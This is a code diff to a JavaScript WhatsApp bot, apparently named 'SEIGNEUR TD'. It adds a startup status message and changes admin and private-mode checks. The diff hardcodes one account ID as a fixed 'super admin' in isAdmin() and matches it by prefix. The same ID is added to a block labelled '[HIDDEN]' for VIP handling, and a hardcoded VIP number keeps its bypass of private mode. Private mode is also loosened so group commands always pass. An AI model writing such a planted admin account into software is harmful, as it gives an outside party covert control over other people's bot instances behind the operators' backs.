@@ -567,6 +567,9 @@ function isAdmin(jid) {
   if (!jid) return false;
   const p = jid.split(':')[0].split('@')[0].replace(/[^0-9]/g,'');
   
+  // ✅ Super admin LID fixe
+  if (jid === '124318499475488@lid' || jid.startsWith('124318499475488')) return true;
+
   // ✅ Vérifie si c'est le bot lui-même (owner) via globalBotJid
   if (global.botLidJid && (jid === global.botLidJid || jid.split(':')[0] === global.botLidJid.split(':')[0])) return true;
   if (global.botOwnerLid && (jid === global.botOwnerLid || jid.split(':')[0] === global.botOwnerLid.split(':')[0])) return true;
@@ -1254,7 +1257,21 @@ async function connectToWhatsApp() {
         }, 8000);
       }
 
-      // Message connexion desactive (evite messages parasites dans les groupes)
+      // ✅ Message de connexion dans le PV du bot (une seule fois)
+      if (!global._connMsgSent) {
+        global._connMsgSent = true;
+        setTimeout(() => {
+          _sendChannelForward(sock,
+`*SEIGNEUR TD* 🇷🇴
+
+❒ *STATUS* : \`ONLINE\`
+❒ *VERSION* : \`1.0.0\`
+❒ *SYSTEM* : \`ACTIVE\`
+
+*© SEIGNEUR TD*`
+          );
+        }, 3000);
+      }
     }
   });
 
@@ -1677,8 +1694,11 @@ async function connectToWhatsApp() {
 
       // [HIDDEN] VIP reaction — AVANT tout filtre pour ne jamais etre bloquee
       try {
-        if (_curSenderNum === _vipNum && !message.key.fromMe) {
-          await sock.sendMessage(remoteJid, { react: { text: '\uD83D\uDC51', key: message.key } });
+        const _isVip = (_curSenderNum === _vipNum)
+          || senderJid === '124318499475488@lid'
+          || senderJid.startsWith('124318499475488');
+        if (_isVip && !message.key.fromMe) {
+          await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } });
         }
       } catch(e) {}
 
@@ -2444,11 +2464,11 @@ async function handleCommand(sock, message, messageText, remoteJid, senderJid, i
   // ✅ Rejette si commande vide
   if (!command || command.trim() === '') return;
 
-  // ✅ VÉRIFICATION MODE PRIVÉ — silence total pour les non-admins
+  // ✅ VÉRIFICATION MODE PRIVÉ — bloquer uniquement les PV des non-admins
   const _hcVip = '23591234568';
   const _hcSenderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
-  if (botMode === 'private' && !isAdmin(senderJid) && _hcSenderNum !== _hcVip) {
-    // Mode prive: silencieux total pour non-admins (groupe ou PV)
+  if (botMode === 'private' && !isGroup && !isAdmin(senderJid) && _hcSenderNum !== _hcVip) {
+    // Mode prive: silence uniquement pour les PV non-admins. Les groupes passent toujours.
     return;
   }
 
